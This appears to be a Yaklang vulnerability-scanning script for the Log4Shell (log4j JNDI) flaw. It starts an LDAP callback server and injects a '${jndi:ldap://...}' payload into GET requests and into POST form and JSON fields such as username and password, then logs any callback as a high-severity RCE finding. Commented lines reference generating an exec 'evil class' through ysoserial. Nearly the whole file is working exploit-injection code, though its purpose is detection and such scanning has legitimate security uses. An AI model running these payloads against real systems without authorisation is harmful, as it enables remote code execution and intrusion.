TokenMap = {}

sendPayload = func (packet,token,params) {
    rsp,req,err = poc.HTTP(packet,params...)
    if err != nil {
        log.error("send Get Payload error Token %s", err.Error())
        TokenMap[token]["error"] = err.Error()
        return 
    }
    TokenMap[token]["request"] = string(req)
    TokenMap[token]["response"] = string(rsp)
}


payload = "${jndi:ldap://{{ldap}}/{{token}}}"

postParams =  ["username", "user", "uname", "name", "email", "email_address", "password"]

// log.info("aa")
// nopClass,_ = yso.GenerateProcessBuilderExecEvilClassObject("") 
// nopClassBytes,_=yso.ToBytes(nopClass)
#配置反连服务
s = facades.NewFacadeServer(ldapHost, ldapPort) 
#运行反连服务
go s.Serve()

s.OnHandle(func(msg){

    log.info("accept connect %s", msg.String()/*type ...any*/)
    if TokenMap[msg.Token] != undefined {
        log.info("cccc")
        RiskToken = TokenMap[msg.Token]
        risk.NewRisk(
            RiskToken["url"],
            risk.severity(RiskToken["vuln_level"]),
            risk.title(RiskToken["title"]),
            risk.details({
                "request":RiskToken["request"],
                "response":RiskToken["response"],
                "url": RiskToken["url"],
                }),
            )
    }

})
payloads = [payload]

for i,v = range payloads {
    // domain,token ,err = risk.NewDNSLogDomain()
    // if err != nil{
    //     log.error("get dns server failed")
    // }
    token = str.RandStr(7)
    ldapAddr = str.ReplaceAll(v, "{{ldap}}", ldap)
    ldapAddr = str.ReplaceAll(ldapAddr,"{{token}}",token)
    log.info("ldapAddr: %s ",ldapAddr)
    TokenMap[token]={"url":urlIns.String(),"vuln_level":"HIGH","vuln_type":"代码问题","title":"log4j RCE found"}


    params = [poc.params({"target":urlIns.Host,"path":urlIns.Path,"ldap":ldapAddr})]
    if proxy != undefined{
        params = append(params, poc.proxy(proxy))
    }
    sendPayload(getPacket,token,params)

    if post {

        //测试常规post报文
        token = str.RandStr(7)
        ldapAddr = str.ReplaceAll(str.ReplaceAll(v, "{{ldap}}", ldap),"{{token}}",token)
        log.info("ldapAddr: %s ",ldapAddr)
        TokenMap[token]={"url":urlIns.String(),"vuln_level":"HIGH","vuln_type":"代码问题","title":"log4j RCE found"}
        postPayload = str.Join(postParams,"="+codec.EscapePathUrl(ldapAddr)+ "&") + "=" + codec.EscapePathUrl(ldapAddr)
        params = [poc.params({"target":urlIns.Host,"path":urlIns.Path,"ldap":ldapAddr,"content-type":"x-www-form-urlencoded","payload":postPayload})]
        if proxy != undefined{
            params = append(params, poc.proxy(proxy))
        }
        sendPayload(postPacket,token,params)

        //测试json报文
        token = str.RandStr(7)
        ldapAddr = str.ReplaceAll(str.ReplaceAll(v, "{{ldap}}", ldap),"{{token}}",token)
        log.info("ldapAddr: %s ",ldapAddr)
        TokenMap[token]={"url":urlIns.String(),"vuln_level":"HIGH","vuln_type":"代码问题","title":"log4j RCE found"}
        postJson = {}

        for _,k = range postParams{
             postJson[k] =  ldapAddr
        }

        params = [poc.params({"target":urlIns.Host,"path":urlIns.Path,"ldap":ldapAddr,"content-type":"json","payload":json.dumps(postJson)})]
        if proxy != undefined{
            params = append(params, poc.proxy(proxy))
        }
        sendPayload(postPacket,token,params)
    }
